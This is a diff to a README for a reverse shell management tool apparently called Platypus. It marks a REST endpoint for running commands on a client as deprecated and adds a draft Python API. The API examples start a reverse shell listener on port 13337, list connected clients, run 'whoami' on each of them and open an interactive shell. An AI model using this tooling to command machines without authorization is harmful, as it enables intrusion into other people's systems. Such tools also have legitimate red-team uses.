@@ -62,7 +62,7 @@ go-bindata -pkg resource -o ./lib/util/resource/resource.go ./lib/runtime/...
 }
 ```
 
-* `POST /client/:hash` execute a command on a specific client
+* [DEPRECATED] `POST /client/:hash` execute a command on a specific client
 
 ```
 # curl -X POST 'http://127.0.0.1:9090/client/0723c3bed0d0240140e10a6ffd36eed4' --data 'cmd=whoami'
@@ -72,9 +72,45 @@ go-bindata -pkg resource -o ./lib/util/resource/resource.go ./lib/runtime/...
 }
 ```
 
-* How to hash?
+* [DEPRECATED] How to hash?
 
 ```
 # echo -n "192.168.1.3:54798" | md5sum
 0723c3bed0d0240140e10a6ffd36eed4  -
+```
+
+
+## [WIP] Python API
+
+### Connect to Platypus backend
+
+```python
+import supytalp
+p = supytalp.init("192.168.1.3", 54798)
+```
+
+### Start a new reverse shell server
+
+```python
+server = p.start("0.0.0.0", 13337)
+```
+
+### Fetch clients of a server
+
+```python
+clients = server.clients()
+```
+
+### Execute command on clients
+
+```python
+for client in clients:
+    print(client.system("whoami"))
+```
+
+### Spawn a interactive shell with a client
+
+```python
+client = clients[0]
+client.spawn()
 ```
